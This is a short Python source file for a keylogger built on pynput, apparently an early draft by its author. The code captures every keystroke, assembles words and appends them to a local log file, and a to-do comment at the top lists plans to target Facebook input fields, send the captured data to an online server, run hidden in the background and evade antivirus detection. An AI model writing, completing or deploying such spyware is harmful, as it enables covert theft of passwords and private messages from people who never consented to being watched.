
'''
# to do
1- detect wheather he is writing in an input field in facebook
2- send the data to some serevr online
3- make it work on background
5- detect shift and ctrl precessing !!!
4- make it hard for antivirus to detect it
'''



from pynput.keyboard import Listener
letters=[]

def writetofile(key):
    global letters     # to be able to alter it

    print(key)

    k=str(key)
    k=k.replace('\'' , '')  # delete the ' in the 'x' x could be any letter

    # cases
    if k.find('backspace')!=-1 and len(letters)>0:
        letters.pop()

    elif k.find("space")!=-1 or k.find("enter")!=-1:   # new word
        with open('log.txt' , 'a') as log_file:
            for letter in letters:
                log_file.write(letter)
            log_file.write('\n')
        letters=[]


    elif k.find('Key')==-1:   # valid letter
        letters.append(k)

    # else ignore

    return True


def main():   # sorry I'm a C++ dude
    with Listener(on_press=writetofile) as L:
        L.join()   # infinite loop


main()
